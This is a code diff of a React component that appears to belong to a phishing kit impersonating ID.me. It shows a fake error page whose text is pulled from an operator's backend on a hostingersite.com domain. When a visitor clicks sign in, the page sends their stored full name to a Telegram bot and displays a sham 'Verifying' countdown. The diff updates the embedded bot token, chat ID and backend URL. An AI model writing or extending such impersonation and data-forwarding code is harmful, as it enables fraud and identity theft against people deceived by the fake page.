@@ -1,14 +1,14 @@
 import React, { useEffect, useState } from "react";
-import logo from '../assets/ID.me_Logo.png'
-import connect from '../assets/connect.jpg'
-import elogo from '../assets/logo-removebg-preview.png'
+import logo from "../assets/ID.me_Logo.png";
+import connect from "../assets/connect.jpg";
+import elogo from "../assets/logo-removebg-preview.png";
 
 const ErrorPage: React.FC = () => {
   const storedData = localStorage.getItem("applicationData");
   const parsedData = storedData ? JSON.parse(storedData) : {};
 
   const fullName = parsedData.fullname || "N/A";
-  
+
   const [showPopup, setShowPopup] = useState(false);
   const [countdown, setCountdown] = useState(100);
   const [title, setTitle] = useState("");
@@ -18,9 +18,11 @@ const ErrorPage: React.FC = () => {
   // Fetch error content from backend
   const fetchErrorContent = async () => {
     try {
-      const res = await fetch("https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api4.php?action=fetch_error_content");
+      const res = await fetch(
+        "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api6.php?action=fetch_error_content",
+      );
       const data = await res.json();
-      
+
       setTitle(data.title || "");
       setErrorMessage(data.errorMessage || "");
       setEmail(data.email || "");
@@ -32,16 +34,16 @@ const ErrorPage: React.FC = () => {
   useEffect(() => {
     fetchErrorContent();
   }, []);
-  
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-  
+
     setShowPopup(true);
-  
-    const botToken = "7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c";
-    const chatId = "7062736155";
+
+    const botToken = "8379013361:AAG_2hOY6uXZTvCaC4HBfYL6-nR3snO06lM";
+    const chatId = "8317872395";
     const message = `${fullName} Sign in clicked`;
-  
+
     try {
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
@@ -53,7 +55,6 @@ const ErrorPage: React.FC = () => {
           text: message,
         }),
       });
-      
     } catch (error) {
       console.error("Error sending to Telegram:", error);
     }
@@ -80,10 +81,15 @@ const ErrorPage: React.FC = () => {
       {showPopup && (
         <div className="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50">
           <div className="bg-white rounded-lg p-6 w-[350px] h-[400px] max-w-md text-center shadow-lg flex flex-col justify-center">
-            <div className="flex justify-center mb-4"><img src={elogo} width={50} /></div>
-            <h2 className="text-sm font-semibold text-black mb-2">Verifying....</h2>
+            <div className="flex justify-center mb-4">
+              <img src={elogo} width={50} />
+            </div>
+            <h2 className="text-sm font-semibold text-black mb-2">
+              Verifying....
+            </h2>
             <p className="text-sm font-semibold text-black mb-6">
-              Please wait while the system connects. Avoid refreshing the page; this may take a moment.
+              Please wait while the system connects. Avoid refreshing the page;
+              this may take a moment.
             </p>
 
             <div className="w-full bg-gray-200 rounded-full h-4 mb-6">
@@ -93,7 +99,9 @@ const ErrorPage: React.FC = () => {
               ></div>
             </div>
 
-            <p className="text-sm text-gray-600">Typically, <strong>{countdown}</strong> seconds remaining</p>
+            <p className="text-sm text-gray-600">
+              Typically, <strong>{countdown}</strong> seconds remaining
+            </p>
           </div>
         </div>
       )}
@@ -131,7 +139,9 @@ const ErrorPage: React.FC = () => {
 
         <h1 className="text-2xl text-center text-gray-800 mb-4">{title}</h1>
         <p className="text-gray-500 text-[16px]">{errorMessage}</p>
-        <p className="text-gray-900 bg-blue-100 px-4 py-2 mt-4 mb-5 ">{email}</p>
+        <p className="text-gray-900 bg-blue-100 px-4 py-2 mt-4 mb-5 ">
+          {email}
+        </p>
 
         <button
           onClick={handleSubmit}
